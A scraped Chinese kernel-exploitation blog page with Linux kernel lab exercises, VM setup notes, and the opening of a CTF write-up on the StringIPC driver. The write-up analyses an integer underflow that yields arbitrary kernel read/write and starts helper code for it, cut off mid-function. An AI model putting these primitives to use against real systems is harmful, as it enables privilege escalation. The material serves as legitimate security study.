c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 8b 0d 23 37 0d 00 f7 d8 64 89 01 48</span><br><span class="line">[  139.812599] RSP: 002b:00007ffdee07d0f8 EFLAGS: 00000246 ORIG_RAX: 0000000000000139</span><br><span class="line">[  139.812600] RAX: ffffffffffffffda RBX: 000055e6a61767c0 RCX: 00007f0f9792173d</span><br><span class="line">[  139.812601] RDX: 0000000000000000 RSI: 000055e6a5c91358 RDI: 0000000000000003</span><br><span class="line">[  139.812602] RBP: 0000000000000000 R08: 0000000000000000 R09: 00007f0f979f8580</span><br><span class="line">[  139.812602] R10: 0000000000000003 R11: 0000000000000246 R12: 000055e6a5c91358</span><br><span class="line">[  139.812603] R13: 0000000000000000 R14: 000055e6a6176760 R15: 0000000000000000</span><br><span class="line">[  139.812604]  &lt;/TASK&gt;</span><br><span class="line">[  139.812605] Modules linked in: oops_mod(OE+) isofs xt_conntrack xt_MASQUERADE nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo xt_addrtype iptable_filter iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 libcrc32c bpfilter br_netfilter bridge stp llc rfcomm aufs overlay bnep vsock_loopback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock binfmt_misc nls_iso8859_1 intel_rapl_msr intel_rapl_common kvm_intel kvm crct10dif_pclmul ghash_clmulni_intel aesni_intel crypto_simd vmw_balloon cryptd btusb input_leds btrtl btbcm btintel bluetooth joydev serio_raw ecdh_generic ecc vmw_vmci mac_hid sch_fq_codel vmwgfx ttm drm_kms_helper cec rc_core fb_sys_fops syscopyarea sysfillrect sysimgblt msr parport_pc ppdev drm lp parport ip_tables x_tables autofs4 hid_generic crc32_pclmul usbhid ahci libahci psmouse hid e1000 mptspi pata_acpi mptscsih mptbase i2c_piix4 scsi_transport_spi</span><br><span class="line">[  139.812636] CR2: 0000000000000000</span><br><span class="line">[  139.812637] ---[ end trace 840a29bcd63bee0c ]---</span><br><span class="line">[  139.812638] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812640] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812641] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812642] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812642] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812643] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812644] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812644] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812645] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812646] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812647] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812664] PKRU: 55555554</span><br></pre></td></tr></table></figure>
<ul>
<li>不仅标识出了触发 kernel oops 的原因，还给出了触发的位置 <code>my_oops_init+0x15</code></li>
</ul>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板中准备 skeletons（具体来说就是 <code>linux/tools/labs/skels</code> 文件夹）</li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<p>下面的练习我就挑几个有意思的挂在博客上：</p>
<p>6.Module parameters：</p>
<ul>
<li>编译并复制关联的模块</li>
<li>并加载内核模块以查看 printk 消息</li>
<li>然后从内核中卸载模块</li>
</ul>
<p>在正常情况下载入模块，是如下的结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_modules/<span class="number">6</span>-cmd-mod<span class="meta"># insmod cmd_mod.ko                </span></span><br><span class="line">cmd_mod: loading out-of-tree <span class="keyword">module</span> taints kernel.                              </span><br><span class="line">Early bird gets the worm  </span><br></pre></td></tr></table></figure>
<ul>
<li>我们的目标就是把输出的 <code>Early bird gets the worm</code> 改为 <code>Early bird gets tired</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Command-line args module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *str = <span class="string">&quot;the worm&quot;</span>;</span><br><span class="line"></span><br><span class="line">module_param(str, charp, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(str, <span class="string">&quot;A simple string&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">cmd_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;Early bird gets %s\n&quot;</span>, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">cmd_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;Exit, stage left\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(cmd_init);</span><br><span class="line">module_exit(cmd_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>module_param</code> 表示向当前模块传入参数</li>
<li>通过如下命令就可以指定参数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_modules/<span class="number">6</span>-cmd-mod<span class="meta"># insmod cmd_mod.ko str=tired</span></span><br><span class="line">Early bird gets tired   </span><br></pre></td></tr></table></figure>
<p>7.Proc info：</p>
<ul>
<li>添加代码以显示当前进程的进程ID和可执行文件名称</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> add missing headers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;List current processes&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_proc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> * <span class="title">pos</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print current process pid and its name */</span></span><br><span class="line">	p = current;</span><br><span class="line">	pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">	pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print the pid and name of all processes */</span></span><br><span class="line">	list_for_each(pos, &amp;p-&gt;tasks)</span><br><span class="line">	&#123;</span><br><span class="line">		p = list_entry(pos, struct task_struct, tasks);</span><br><span class="line">		pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">		pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_proc_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print current process pid and name */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	p = current;</span><br><span class="line">	pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">	pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_proc_init);</span><br><span class="line">module_exit(my_proc_exit);</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/10/Linux-Lab0-Preparation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/10/Linux-Lab0-Preparation/" class="post-title-link" itemprop="url">Linux-Lab0-Preparation</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-10 00:04:58 / Modified: 00:07:40" itemprop="dateCreated datePublished" datetime="2022-10-10T00:04:58+08:00">2022-10-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Experimental preparation</strong></p>
<p>在 Github 上下载对应的实验文件：<a target="_blank" rel="noopener" href="https://github.com/linux-kernel-labs/linux">linux-kernel-labs/linux: Linux kernel source tree (github.com)</a> </p>
<p>在 <code>tools/labs</code> 目录中输入命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=kernel_modules make skels</span><br></pre></td></tr></table></figure>
<p>然后在 <code>skels/kernel_modules</code> 目录中就会有实验文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ ls skels/kernel_modules/</span><br><span class="line">1-2-test-mod  4-multi-mod  6-cmd-mod    8-kdb</span><br><span class="line">3-error-mod   5-oops-mod   7-list-proc  9-dyndbg</span><br></pre></td></tr></table></figure>
<p><strong>Booting the virtual machine</strong></p>
<p>虚拟机基础结构摘要：</p>
<ul>
<li><code>~/src/linux</code>：Linux 内核源代码，编译模块需要</li>
<li><code>~/src/linux/tools/labs/qemu</code>：用于生成和运行 QEMU VM 的脚本和辅助文件</li>
</ul>
<p>为了启动虚拟机，我们需要在 <code>~/src/linux/tools/labs</code> 目录中使用 <code>make boot</code> 命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ make boot </span><br><span class="line">make -C /home/yhellow/linux</span><br><span class="line">make[1]: 进入目录“/home/yhellow/linux”</span><br><span class="line">  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>在默认情况下，您不会收到提示或任何图形界面，但您可以使用 minicom 或屏幕连接到虚拟机公开的控制台：</p>
<ul>
<li>在 <code>~/src/linux/tools/labs</code> 目录中使用 <code>minicom -D serial.pts</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ minicom -D serial.pts</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Welcome to minicom <span class="number">2.7</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">OPTIONS: I18n </span><br><span class="line">Compiled on Dec <span class="number">23</span> <span class="number">2019</span>, <span class="number">02</span>:<span class="number">06</span>:<span class="number">26.</span></span><br><span class="line">Port serial.pts, <span class="number">19</span>:<span class="number">21</span>:<span class="number">44</span></span><br><span class="line"></span><br><span class="line">Press CTRL-A Z <span class="keyword">for</span> help on special keys</span><br></pre></td></tr></table></figure>
<ul>
<li>要访问虚拟机，请在登录提示符下输入用户名 root，无需输入密码</li>
<li>虚拟机将使用 root 帐户的权限启动</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Poky (Yocto Project Reference Distro) <span class="number">2.3</span> qemux86 /dev/hvc0</span><br><span class="line"></span><br><span class="line">qemux86 login: root                                                 </span><br><span class="line">root@qemux86:~<span class="meta"># whoami                                                          </span></span><br><span class="line">root                                                                            </span><br><span class="line">root@qemux86:~# </span><br></pre></td></tr></table></figure>
<p><strong>Adding and using a virtual disk</strong></p>
<p>在目录中，您有一个新的虚拟机磁盘，位于文件 <code>~/src/linux/tools/labs/mydisk.img</code>，我们要将磁盘添加到虚拟机中，并在虚拟机中使用它</p>
<ul>
<li>如果没有 <code>mydisk.img</code> 文件，则在如下网站中下载：<a target="_blank" rel="noopener" href="http://elf.cs.pub.ro/so2/res/laboratoare/mydisk.img">mydisk.img</a></li>
</ul>
<p>修改 <code>~/src/linux/tools/labs/qemu/Makefile</code>，在对应位置添加如下代码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-drive file=$(YOCTO_IMAGE),if=virtio,format=raw \</span><br><span class="line">-drive file=disk1.img,if=virtio,format=raw \</span><br><span class="line">-drive file=disk2.img,if=virtio,format=raw \</span><br><span class="line">-drive file=mydisk.img,if=virtio,format=raw \ # new</span><br></pre></td></tr></table></figure>
<p>启动虚拟机，创建目录并尝试挂载新磁盘</p>
<ul>
<li>已经向 qemu 添加了两个磁盘（<code>disk1.img</code> 和 <code>disk2.img</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~# /dev/vd                                                         </span><br><span class="line">vda  vdb  vdc  vdd </span><br></pre></td></tr></table></figure>
<ul>
<li>vda 是根分区，vdb 是 <code>disk1.img</code>，vdc 是 <code>disk2.img</code>，vdd 是 <code>mydisk.img</code></li>
<li>无需在 <code>/dev</code> 中手动创建新磁盘的条目，因为虚拟机使用 devtmpfs（在 Linux 内核启动早期建立一个初步的 <code>/dev</code>，令一般启动程序不用等待 udev）</li>
<li>使用 <code>mount</code> 命令进行挂载：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test</span><br><span class="line">mount /dev/vdd /test</span><br></pre></td></tr></table></figure>
<ul>
<li>结果挂载失败了（<code>/test</code> 中并没有出现 <code>mydisk.img</code> 中的文件），我们无法挂载虚拟磁盘的原因是，我们在内核中没有支持格式化的文件系统</li>
<li>您需要识别 mydisk.img 的文件系统，并编译对该文件系统的内核支持</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ file mydisk.img </span><br><span class="line">mydisk.img: BTRFS Filesystem sectorsize 4096, nodesize 4096, leafsize 4096, UUID=df3c665a-363d-46f8-aef0-f9959bad6832, 32768/104857600 bytes used, 1 devices</span><br></pre></td></tr></table></figure>
<ul>
<li>您需要在内核中启用 btrfs 支持并重新编译内核映像（退出前记得 save）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">----------------------------------------</span><br><span class="line">File systems -&gt; Btrfs filesystem support</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># mount /dev/vdd /test                                            </span></span><br><span class="line">BTRFS: device fsid df3c665a<span class="number">-363</span>d<span class="number">-46f</span>8-aef0-f9959bad6832 devid <span class="number">1</span> transid <span class="number">9</span> /dev/)</span><br><span class="line"><span class="function">BTRFS <span class="title">info</span> <span class="params">(device vdd)</span>: disk space caching is enabled                          </span></span><br><span class="line"><span class="function">root@qemux86:~<span class="meta"># ls /test                                                        </span></span></span><br><span class="line"><span class="function">README                                                                          </span></span><br><span class="line"><span class="function">root@qemux86:~<span class="meta"># cat /test/README                                                </span></span></span><br><span class="line"><span class="function">Congratulations, you were able to follow instructions!  </span></span><br></pre></td></tr></table></figure>
<p><strong>GDB spelunking</strong></p>
<p>使用 gdb 显示创建内核线程 kernel_thread 的函数的源代码</p>
<ul>
<li>使用 gdb 查找内存中  jiffies 变量的地址及其内容</li>
<li>该变量保存自系统启动以来的计时周期数</li>
</ul>
<p>要跟踪 jiffies 变量的值，请在 gdb 中使用动态分析，方法是：</p>
<ul>
<li>先启动虚拟机</li>
<li>然后运行 <code>make gdb</code> 命令</li>
</ul>
<p>PS：由于我这里的环境有点问题，所以我使用了 <code>gdb vmlinux</code> 外加 <code>target remote :1234</code> 的形式来进行调试（也可以参考一下）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx &amp; jiffies</span><br><span class="line"><span class="number">0xc194b500</span> &lt;jiffies_64&gt;:	<span class="number">0x00000000ffff96c2</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/08/cred%20attack+vdso%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/08/cred%20attack+vdso%20attack/" class="post-title-link" itemprop="url">cred attack+vdso attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-08 22:25:14 / Modified: 22:29:32" itemprop="dateCreated datePublished" datetime="2022-10-08T22:25:14+08:00">2022-10-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>StringIPC 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 </span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap（这是我自己加的，原题没有）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">/bin/mount -a</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t tmpfs -o size=64k,mode=0755 tmpfs /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">sysctl -w kernel.hotplug=/sbin/mdev</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">insmod StringIPC.ko # 驱动模块</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">echo &quot;man, you got me&quot; &gt; flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">chmod 766 /dev/csaw</span><br><span class="line">nohup /sudo_timer &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>和 <code>qwb2018-solid_core</code> 的漏洞点一样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf_size = channel-&gt;buf_size;</span><br><span class="line">ch1 = buf_size + id;</span><br><span class="line">ch2 = buf_size - id;</span><br><span class="line"><span class="keyword">if</span> ( !key_s )</span><br><span class="line">    ch1 = ch2;</span><br><span class="line">data = (<span class="keyword">char</span> *)krealloc(channel-&gt;data, ch1 + <span class="number">1</span>, <span class="number">0x24000C0</span>LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>CSAW_SHRINK_CHANNEL 会导致 <code>ch2</code> 负数溢出为“-1”</li>
<li><code>krealloc(channel-&gt;data, 0, 0x24000C0LL)</code> 返回“0”，使后面的 <code>channel-&gt;data = 0</code>，而 <code>channel-&gt;buf_size</code> 非常大  </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;data = data;</span><br><span class="line">channel-&gt;buf_size = ch1;</span><br></pre></td></tr></table></figure>
<ul>
<li>进而绕过后面的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( channel_from.size + index_write &gt; channel_write-&gt;buf_size )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 <code>qwb2018-solid_core</code> 中，作者禁用了 “cred attack” 和 “vdso attack” 这两种方法，这里就来试一试</p>
<p>首先 WAA，RAA 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span 